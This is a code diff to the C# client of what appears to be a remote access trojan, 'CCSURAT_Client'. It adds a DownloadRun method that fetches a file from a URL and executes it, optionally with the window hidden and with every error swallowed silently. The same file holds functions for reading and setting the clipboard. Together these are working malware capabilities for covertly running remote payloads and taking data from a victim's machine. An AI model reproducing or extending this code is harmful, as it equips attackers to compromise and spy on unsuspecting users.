@@ -5,6 +5,8 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Diagnostics;
+using System.Net;
 
 namespace CCSURAT_Client
 {
@@ -89,8 +91,7 @@ namespace CCSURAT_Client
             return null;
         }
 
-        // ########## Desperate attempt to get clipboard, DOES NOT WORK, need to figure out why.
-        // #####################################################################################
+        // Get/Set clipboard data.
         public static string GetClipboard()
         {
             IDataObject iData = Clipboard.GetDataObject();
@@ -99,6 +100,29 @@ namespace CCSURAT_Client
         public static void SetClipboard(string s)
         {
             Clipboard.SetText(s);
+        }
+
+        // Downloads and executes file from a URL. File downloads to current client directory.
+        public static void DownloadRun(string url, string type)
+        {
+            try
+            {
+                WebClient webClient = new WebClient();
+                string file = url.Substring(url.LastIndexOf("/") + 1);
+                webClient.DownloadFile(url, Environment.CurrentDirectory + "\\" + file);
+                Process start = new Process();
+                start.StartInfo.FileName = Environment.CurrentDirectory + "\\" + file;
+                if (type == "HIDDEN")
+                {
+                    start.StartInfo.CreateNoWindow = true;
+                    start.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                }
+                start.Start();
+            }
+            catch (Exception ex)
+            {
+
+            }
         }
     }
 }
